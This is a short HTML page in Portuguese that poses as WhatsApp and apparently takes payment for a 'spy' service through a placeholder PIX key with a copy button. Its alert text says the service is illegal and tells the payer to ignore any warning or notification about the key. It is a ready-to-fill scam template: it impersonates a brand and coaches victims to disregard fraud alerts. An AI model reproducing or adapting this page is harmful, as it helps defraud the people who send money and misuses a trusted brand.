<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>WhatsApp</title>

<style>
body {
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(270deg, #d4f8e8, #b2f2d7, #d4f8e8);
  background-size: 600% 600%;
  animation: gradientMove 12s ease infinite;
}

@keyframes gradientMove {
  0% {background-position: 0% 50%;}
  50% {background-position: 100% 50%;}
  100% {background-position: 0% 50%;}
}

.container {
  width: 100%;
  max-width: 650px;
  padding: 20px;
}

.card {
  background: white;
  padding: 50px;
  border-radius: 25px;
  text-align: center;
  box-shadow: 0 20px 50px rgba(0,0,0,0.2);
}

.logo {
  font-size: 40px;
  font-weight: 700;
  color: #128C7E;
  letter-spacing: 2px;
  margin-bottom: 10px;
}

.spy {
  width: 60px;
  margin-bottom: 15px;
}

.alert {
  font-size: 14px;
  color: #444;
  line-height: 1.6;
  margin-bottom: 25px;
  font-weight: 500;
}

.pix {
  background: #f5f5f5;
  padding: 20px;
  border-radius: 15px;
  font-size: 16px;
  word-break: break-all;
  margin-bottom: 25px;
}

button {
  background: #25D366;
  border: none;
  color: white;
  padding: 18px;
  width: 100%;
  border-radius: 15px;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
}

button:hover {
  background: #1ebe5d;
  transform: scale(1.05);
}

.msg {
  margin-top: 15px;
  color: green;
  font-size: 15px;
}
</style>
</head>

<body>

<div class="container">
  <div class="card">

    <div class="logo">WhatsApp</div>

    <!-- Ícone de espião (SVG profissional) -->
    <svg class="spy" viewBox="0 0 64 64">
      <circle cx="32" cy="32" r="30" fill="#000"/>
      <circle cx="24" cy="28" r="5" fill="#fff"/>
      <circle cx="40" cy="28" r="5" fill="#fff"/>
      <rect x="18" y="38" width="28" height="6" fill="#fff"/>
    </svg>

    <div class="alert">
      Devido à ilegalidade do serviço, a chave gerada não corresponde a uma chave validada padrão;
      assim, qualquer notificação ou alerta será causada pelo tipo específico de serviço executado,
      portanto ignore.
    </div>

    <div class="pix" id="pix">
      SUA_CHAVE_PIX_AQUI
    </div>

    <button onclick="copiarPix()">📋 Copiar PIX</button>

    <div class="msg" id="msg"></div>

  </div>
</div>

<script>
function copiarPix() {
  const pix = document.getElementById("pix").innerText;

  navigator.clipboard.writeText(pix).then(() => {
    document.getElementById("msg").innerText = "PIX copiado com sucesso!";
  }).catch(() => {
    document.getElementById("msg").innerText = "Erro ao copiar.";
  });
}
</script>

</body>
</html>
